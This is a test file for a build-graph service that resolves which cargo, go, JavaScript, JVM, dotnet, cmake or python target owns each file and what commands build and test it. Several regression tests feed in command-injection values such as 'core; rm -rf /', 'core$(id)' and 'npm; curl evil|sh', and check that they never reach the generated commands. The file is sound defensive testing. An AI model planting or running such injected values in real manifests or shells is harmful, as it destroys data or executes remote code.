import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'

import { afterEach, describe, expect, test } from 'bun:test'

import {
  clearBuildGraphCache,
  resolveOwningTargets,
} from '../services/build-graph'

import type { BuildGraphRunner } from '../services/build-graph'

const roots: string[] = []
const FILESYSTEM_DISCOVERY_TIMEOUT_MS = 15_000
afterEach(() => {
  clearBuildGraphCache()
  for (const root of roots.splice(0))
    fs.rmSync(root, { recursive: true, force: true })
})

function tempRoot() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'openbuff-build-graph-'))
  roots.push(root)
  return root
}

function writeFixture(root: string, relative: string, contents: string) {
  const absolute = path.join(root, ...relative.split('/'))
  fs.mkdirSync(path.dirname(absolute), { recursive: true })
  fs.writeFileSync(absolute, contents)
}

const failingRunner: BuildGraphRunner = () => ({
  exitCode: 1,
  stdout: '',
  stderr: 'tool not available',
})

describe('build graph service', () => {
  test('resolves rust crate ownership and commands from cargo metadata', () => {
    const root = tempRoot()
    // The sync ecosystem probes are gated on a discovered manifest, so the
    // fixture needs one for the cargo resolver to run at all.
    writeFixture(root, 'Cargo.toml', '[package]\nname = "ws"\n')
    const runner: BuildGraphRunner = (argv) => {
      if (argv[0] === 'cargo') {
        return {
          exitCode: 0,
          stdout: JSON.stringify({
            packages: [
              {
                name: 'core',
                manifest_path: path.join(
                  root,
                  'crates',
                  'core',
                  'Cargo.toml',
                ),
                targets: [{ name: 'core', kind: ['lib'] }],
              },
              {
                name: 'cli',
                manifest_path: path.join(root, 'crates', 'cli', 'Cargo.toml'),
                targets: [{ name: 'cli', kind: ['bin'] }],
              },
            ],
          }),
          stderr: '',
        }
      }
      return { exitCode: 1, stdout: '', stderr: '' }
    }
    expect(
      resolveOwningTargets({
        cwd: root,
        files: ['crates/core/src/lib.rs', 'crates/cli/src/main.rs'],
        runner,
      }),
    ).toEqual([
      {
        file: 'crates/core/src/lib.rs',
        ecosystem: 'rust',
        targets: [
          {
            name: 'core',
            kind: 'crate',
            root: 'crates/core',
            testCommand: 'cargo test -p core',
            buildCommand: 'cargo build -p core',
          },
        ],
        confidence: 'confirmed',
      },
      {
        file: 'crates/cli/src/main.rs',
        ecosystem: 'rust',
        targets: [
          {
            name: 'cli',
            kind: 'crate',
            root: 'crates/cli',
            testCommand: 'cargo test -p cli',
            buildCommand: 'cargo build -p cli',
          },
        ],
        confidence: 'confirmed',
      },
    ])
  })

  test('resolves go package ownership and commands from go list', () => {
    const root = tempRoot()
    writeFixture(root, 'go.mod', 'module example.com/mymod\n\ngo 1.21\n')
    const runner: BuildGraphRunner = (argv) => {
      if (argv[0] === 'go') {
        const packages = [
          { ImportPath: 'example.com/mymod', Dir: root },
          {
            ImportPath: 'example.com/mymod/api',
            Dir: path.join(root, 'api'),
          },
        ]
        return {
          exitCode: 0,
          stdout: packages.map((pkg) => JSON.stringify(pkg)).join('\n'),
          stderr: '',
        }
      }
      return { exitCode: 1, stdout: '', stderr: '' }
    }
    // The root package also owns api/server.go by prefix; the longer `api`
    // prefix must win.
    expect(
      resolveOwningTargets({ cwd: root, files: ['api/server.go'], runner }),
    ).toEqual([
      {
        file: 'api/server.go',
        ecosystem: 'go',
        targets: [
          {
            name: 'example.com/mymod/api',
            kind: 'package',
            root: 'api',
            testCommand: 'go test example.com/mymod/api',
            buildCommand: 'go build example.com/mymod/api',
          },
        ],
        confidence: 'confirmed',
      },
    ])
  })

  test(
    'resolves javascript workspace package ownership from manifests and scripts',
    () => {
      const root = tempRoot()
      writeFixture(
        root,
        'package.json',
        JSON.stringify({ private: true, workspaces: ['packages/*'] }),
      )
      writeFixture(root, 'pnpm-lock.yaml', '')
      writeFixture(
        root,
        'packages/api/package.json',
        JSON.stringify({
          name: '@app/api',
          scripts: { test: 'vitest run', build: 'tsc -b' },
        }),
      )
      expect(
        resolveOwningTargets({
          cwd: root,
          files: ['packages/api/src/index.ts'],
          runner: failingRunner,
        }),
      ).toEqual([
        {
          file: 'packages/api/src/index.ts',
          ecosystem: 'javascript',
          targets: [
            {
              name: '@app/api',
              kind: 'package',
              root: 'packages/api',
              testCommand: 'pnpm run test',
              buildCommand: 'pnpm run build',
            },
          ],
          confidence: 'confirmed',
        },
      ])
    },
    FILESYSTEM_DISCOVERY_TIMEOUT_MS,
  )

  test('reports unknown for files with no owning target', () => {
    const root = tempRoot()
    expect(
      resolveOwningTargets({
        cwd: root,
        files: ['docs/guide.md'],
        runner: failingRunner,
      }),
    ).toEqual([
      {
        file: 'docs/guide.md',
        ecosystem: 'unknown',
        targets: [],
        confidence: 'unknown',
      },
    ])
  })

  test(
    'treats absent ecosystem tools as honest skips without breaking other ecosystems',
    () => {
      const root = tempRoot()
      writeFixture(
        root,
        'web/package.json',
        JSON.stringify({
          name: 'web',
          packageManager: 'bun@1.0.0',
          scripts: { test: 'bun test' },
        }),
      )
      const enoentRunner: BuildGraphRunner = () => {
        throw new Error('spawnSync cargo ENOENT')
      }
      // A rust file in a tool-less repo resolves to nothing rather than a
      // guessed crate.
      expect(
        resolveOwningTargets({
          cwd: root,
          files: ['src/main.rs'],
          runner: enoentRunner,
        }),
      ).toEqual([
        {
          file: 'src/main.rs',
          ecosystem: 'unknown',
          targets: [],
          confidence: 'unknown',
        },
      ])
      // The same throwing runner must not break filesystem-discovered
      // ecosystems.
      const [resolution] = resolveOwningTargets({
        cwd: root,
        files: ['web/src/app.ts'],
        runner: enoentRunner,
      })
      expect(resolution).toMatchObject({
        ecosystem: 'javascript',
        confidence: 'confirmed',
        targets: [{ name: 'web', testCommand: 'bun run test' }],
      })
    },
    FILESYSTEM_DISCOVERY_TIMEOUT_MS,
  )

  // Cache-identity regression pin (P3 coherence audit): the per-cwd cache is
  // keyed by root + runner identity, so two different runners against the same
  // cwd within the TTL window each observe their OWN results — an injected
  // runner must never read the default runner's (or another fake's) cached
  // index.
  test('separates cached results per runner for the same cwd within the TTL window', () => {
    const root = tempRoot()
    writeFixture(root, 'Cargo.toml', '[package]\nname = "core"\n')
    let firstCalls = 0
    let secondCalls = 0
    const firstRunner: BuildGraphRunner = (argv) => {
      if (argv[0] === 'cargo') {
        firstCalls++
        return {
          exitCode: 0,
          stdout: JSON.stringify({
            packages: [
              { name: 'first', manifest_path: path.join(root, 'Cargo.toml') },
            ],
          }),
          stderr: '',
        }
      }
      return { exitCode: 1, stdout: '', stderr: '' }
    }
    const secondRunner: BuildGraphRunner = (argv) => {
      if (argv[0] === 'cargo') {
        secondCalls++
        return {
          exitCode: 0,
          stdout: JSON.stringify({
            packages: [
              { name: 'second', manifest_path: path.join(root, 'Cargo.toml') },
            ],
          }),
          stderr: '',
        }
      }
      return { exitCode: 1, stdout: '', stderr: '' }
    }
    const files = ['src/lib.rs']

    const [firstResolution] = resolveOwningTargets({ cwd: root, files, runner: firstRunner })
    const [secondResolution] = resolveOwningTargets({ cwd: root, files, runner: secondRunner })
    // Each runner built its own index (no cross-runner cache hit).
    expect(firstCalls).toBe(1)
    expect(secondCalls).toBe(1)
    expect(firstResolution).toMatchObject({ targets: [{ name: 'first' }] })
    expect(secondResolution).toMatchObject({ targets: [{ name: 'second' }] })

    // Repeat calls within the TTL window stay cached per runner.
    resolveOwningTargets({ cwd: root, files, runner: firstRunner })
    resolveOwningTargets({ cwd: root, files, runner: secondRunner })
    expect(firstCalls).toBe(1)
    expect(secondCalls).toBe(1)
  })

  test('caches per-cwd ecosystem detection until cleared', () => {
    const root = tempRoot()
    writeFixture(root, 'Cargo.toml', '[package]\nname = "core"\n')
    let cargoCalls = 0
    const runner: BuildGraphRunner = (argv) => {
      if (argv[0] === 'cargo') {
        cargoCalls++
        return {
          exitCode: 0,
          stdout: JSON.stringify({
            // No `targets` field: missing fields must be tolerated.
            packages: [
              { name: 'core', manifest_path: path.join(root, 'Cargo.toml') },
            ],
          }),
          stderr: '',
        }
      }
      return { exitCode: 1, stdout: '', stderr: '' }
    }
    const files = ['src/lib.rs']
    resolveOwningTargets({ cwd: root, files, runner })
    expect(cargoCalls).toBe(1)
    resolveOwningTargets({ cwd: root, files, runner })
    expect(cargoCalls).toBe(1)
    clearBuildGraphCache()
    const [resolution] = resolveOwningTargets({ cwd: root, files, runner })
    expect(cargoCalls).toBe(2)
    expect(resolution).toMatchObject({
      ecosystem: 'rust',
      confidence: 'confirmed',
      targets: [{ name: 'core', root: '.' }],
    })
  })

  test(
    'resolves jvm, dotnet, cmake, and python module ownership from manifest dirs',
    () => {
      const root = tempRoot()
      writeFixture(root, 'services/api/pom.xml', '<project/>')
      writeFixture(root, 'libs/ui/build.gradle.kts', '')
      writeFixture(root, 'app/App.csproj', '<Project/>')
      writeFixture(
        root,
        'native/CMakeLists.txt',
        'cmake_minimum_required(VERSION 3.20)',
      )
      writeFixture(root, 'pkg/pyproject.toml', '[project]\nname="pkg"')

      expect(
        resolveOwningTargets({
          cwd: root,
          files: [
            'services/api/src/Main.java',
            'libs/ui/src/Main.kt',
            'app/Program.cs',
            'native/main.c',
            'pkg/mod.py',
          ],
          runner: failingRunner,
        }),
      ).toEqual([
        {
          file: 'services/api/src/Main.java',
          ecosystem: 'java',
          targets: [
            {
              name: 'api',
              kind: 'module',
              root: 'services/api',
              testCommand: 'mvn -pl services/api test',
              buildCommand: 'mvn -pl services/api package',
            },
          ],
          confidence: 'inferred',
        },
        {
          file: 'libs/ui/src/Main.kt',
          ecosystem: 'jvm',
          targets: [
            {
              name: ':libs:ui',
              kind: 'module',
              root: 'libs/ui',
              testCommand: 'gradle :libs:ui:test',
              buildCommand: 'gradle :libs:ui:build',
            },
          ],
          confidence: 'inferred',
        },
        {
          file: 'app/Program.cs',
          ecosystem: 'dotnet',
          targets: [
            {
              name: 'App.csproj',
              kind: 'project',
              root: 'app',
              testCommand: 'dotnet test app/App.csproj',
              buildCommand: 'dotnet build app/App.csproj',
            },
          ],
          confidence: 'inferred',
        },
        {
          file: 'native/main.c',
          ecosystem: 'c-cpp',
          targets: [{ name: 'native', kind: 'project', root: 'native' }],
          confidence: 'inferred',
        },
        {
          file: 'pkg/mod.py',
          ecosystem: 'python',
          targets: [
            {
              name: 'pkg',
              kind: 'package',
              root: 'pkg',
              testCommand: 'python -m pytest pkg',
            },
          ],
          confidence: 'inferred',
        },
      ])
    },
    FILESYSTEM_DISCOVERY_TIMEOUT_MS,
  )

  // F4 regression pin (python resolver command-token whitelist): a manifest
  // directory containing a shell metacharacter keeps its target but gets NO
  // interpolated testCommand, exactly like the cargo/go/jvm/dotnet resolvers.
  test('omits the python test command for a manifest directory with shell metacharacters', () => {
    const root = tempRoot()
    writeFixture(root, 'pkg;rm-rf/pyproject.toml', '[project]\nname="p"\n')
    const [resolution] = resolveOwningTargets({
      cwd: root,
      files: ['pkg;rm-rf/mod.py'],
      runner: failingRunner,
    })
    expect(resolution).toMatchObject({
      ecosystem: 'python',
      confidence: 'inferred',
      targets: [{ name: 'pkg;rm-rf', kind: 'package', root: 'pkg;rm-rf' }],
    })
    expect(resolution.targets[0]?.testCommand).toBeUndefined()
  })

  // BG-1 regression pin (javascript resolver command-token whitelist): the
  // `packageManager` field is attacker-controlled manifest content and is
  // interpolated as the `${manager} run <script>` prefix. A metacharacter-
  // bearing manager must NOT reach the command string; the recommendation
  // falls back to 'npm' so the target keeps usable commands.
  test(
    'falls back to npm for a packageManager field with shell metacharacters',
    () => {
      const root = tempRoot()
      writeFixture(
        root,
        'package.json',
        JSON.stringify({
          name: 'web',
          packageManager: 'npm; curl evil|sh',
          scripts: { test: 'vitest run', build: 'tsc -b' },
        }),
      )
      const [resolution] = resolveOwningTargets({
        cwd: root,
        files: ['src/index.ts'],
        runner: failingRunner,
      })
      expect(resolution.ecosystem).toBe('javascript')
      // The target keeps usable commands, but with the sanitized fallback
      // manager — never the hostile token.
      expect(resolution.targets).toHaveLength(1)
      expect(resolution.targets[0]?.testCommand).toBe('npm run test')
      expect(resolution.targets[0]?.buildCommand).toBe('npm run build')
    },
    FILESYSTEM_DISCOVERY_TIMEOUT_MS,
  )

  // Positive pin: a legitimate version-pinned `packageManager` must still
  // produce a command naming the real manager, not the 'npm' fallback.
  test(
    'keeps the manager name for a version-pinned packageManager field',
    () => {
      const root = tempRoot()
      writeFixture(
        root,
        'package.json',
        JSON.stringify({
          name: 'web',
          packageManager: 'pnpm@9.0.0+sha256.abc',
          scripts: { test: 'vitest run' },
        }),
      )
      const [resolution] = resolveOwningTargets({
        cwd: root,
        files: ['src/index.ts'],
        runner: failingRunner,
      })
      expect(resolution.ecosystem).toBe('javascript')
      expect(resolution.targets[0]?.testCommand).toBe('pnpm run test')
    },
    FILESYSTEM_DISCOVERY_TIMEOUT_MS,
  )

  test('caps the number of files resolved per call', () => {
    const root = tempRoot()
    const files = Array.from({ length: 501 }, (_, index) => `f-${index}.ts`)
    expect(
      resolveOwningTargets({ cwd: root, files, runner: failingRunner }),
    ).toHaveLength(500)
  })

  test('skips the sync ecosystem probes when no matching manifest is discovered', () => {
    const root = tempRoot()
    const probed: string[][] = []
    const runner: BuildGraphRunner = (argv) => {
      probed.push(argv)
      return { exitCode: 1, stdout: '', stderr: '' }
    }
    writeFixture(root, 'package.json', JSON.stringify({ name: 'web' }))
    const [resolution] = resolveOwningTargets({
      cwd: root,
      files: ['src/index.ts'],
      runner,
    })
    // `cargo metadata` / `go list` are never spawned in a repo without a
    // Cargo.toml/go.mod: the sync probes stay off the event loop here while
    // the filesystem-discovered ecosystem still resolves.
    expect(probed).toEqual([])
    expect(resolution).toMatchObject({
      ecosystem: 'javascript',
      confidence: 'inferred',
      targets: [{ name: 'web', root: '.' }],
    })
  })

  // F4 regression pin (command-token whitelist, SAFE_COMMAND_TOKEN): manifest
  // / tool-reported identifiers are attacker-controlled and are interpolated
  // into testCommand/buildCommand strings. A token with a shell metacharacter
  // must keep its target but OMIT the command fields (testCommand/buildCommand
  // === undefined), never get interpolated into a runnable string.
  test('omits rust commands for a cargo package name with shell metacharacters', () => {
    const root = tempRoot()
    writeFixture(root, 'Cargo.toml', '[package]\nname = "ws"\n')
    const hostile = 'core; rm -rf /'
    const runner: BuildGraphRunner = (argv) => {
      if (argv[0] === 'cargo') {
        return {
          exitCode: 0,
          stdout: JSON.stringify({
            packages: [
              {
                name: hostile,
                manifest_path: path.join(root, 'crates', 'core', 'Cargo.toml'),
                targets: [{ name: hostile, kind: ['lib'] }],
              },
            ],
          }),
          stderr: '',
        }
      }
      return { exitCode: 1, stdout: '', stderr: '' }
    }
    const [resolution] = resolveOwningTargets({
      cwd: root,
      files: ['crates/core/src/lib.rs'],
      runner,
    })
    // The target is kept (name/kind/root), but the hostile token is NOT
    // interpolated into a command string.
    expect(resolution.ecosystem).toBe('rust')
    expect(resolution.targets).toHaveLength(1)
    expect(resolution.targets[0].name).toBe(hostile)
    expect(resolution.targets[0].kind).toBe('crate')
    expect(resolution.targets[0].root).toBe('crates/core')
    expect(resolution.targets[0].testCommand).toBeUndefined()
    expect(resolution.targets[0].buildCommand).toBeUndefined()
  })

  test('omits rust commands for a cargo package name using command substitution', () => {
    const root = tempRoot()
    writeFixture(root, 'Cargo.toml', '[package]\nname = "ws"\n')
    const hostile = 'core$(id)'
    const runner: BuildGraphRunner = (argv) => {
      if (argv[0] === 'cargo') {
        return {
          exitCode: 0,
          stdout: JSON.stringify({
            packages: [
              {
                name: hostile,
                manifest_path: path.join(root, 'crates', 'core', 'Cargo.toml'),
                targets: [{ name: hostile, kind: ['lib'] }],
              },
            ],
          }),
          stderr: '',
        }
      }
      return { exitCode: 1, stdout: '', stderr: '' }
    }
    const [resolution] = resolveOwningTargets({
      cwd: root,
      files: ['crates/core/src/lib.rs'],
      runner,
    })
    expect(resolution.targets).toHaveLength(1)
    expect(resolution.targets[0].name).toBe(hostile)
    expect(resolution.targets[0].testCommand).toBeUndefined()
    expect(resolution.targets[0].buildCommand).toBeUndefined()
  })

  test('omits go commands for a hostile go ImportPath', () => {
    const root = tempRoot()
    writeFixture(root, 'go.mod', 'module example.com/mymod\n\ngo 1.21\n')
    const hostile = 'example.com/mymod; rm -rf /'
    const runner: BuildGraphRunner = (argv) => {
      if (argv[0] === 'go') {
        const packages = [{ ImportPath: hostile, Dir: path.join(root, 'api') }]
        return {
          exitCode: 0,
          stdout: packages.map((pkg) => JSON.stringify(pkg)).join('\n'),
          stderr: '',
        }
      }
      return { exitCode: 1, stdout: '', stderr: '' }
    }
    const [resolution] = resolveOwningTargets({
      cwd: root,
      files: ['api/server.go'],
      runner,
    })
    expect(resolution.ecosystem).toBe('go')
    expect(resolution.targets).toHaveLength(1)
    expect(resolution.targets[0].name).toBe(hostile)
    expect(resolution.targets[0].kind).toBe('package')
    expect(resolution.targets[0].root).toBe('api')
    expect(resolution.targets[0].testCommand).toBeUndefined()
    expect(resolution.targets[0].buildCommand).toBeUndefined()
  })

  // Positive pin: the colon is allowed by the whitelist (Gradle project paths
  // like ':libs:ui:test'); it is not a shell command separator. A gradle
  // module path must still get its command strings.
  test(
    'keeps gradle commands for a colon-containing project path that passes the whitelist',
    () => {
      const root = tempRoot()
      writeFixture(root, 'libs/ui/build.gradle.kts', '')
      expect(
        resolveOwningTargets({
          cwd: root,
          files: ['libs/ui/src/Main.kt'],
          runner: failingRunner,
        }),
      ).toEqual([
        {
          file: 'libs/ui/src/Main.kt',
          ecosystem: 'jvm',
          targets: [
            {
              name: ':libs:ui',
              kind: 'module',
              root: 'libs/ui',
              testCommand: 'gradle :libs:ui:test',
              buildCommand: 'gradle :libs:ui:build',
            },
          ],
          confidence: 'inferred',
        },
      ])
    },
    FILESYSTEM_DISCOVERY_TIMEOUT_MS,
  )
})
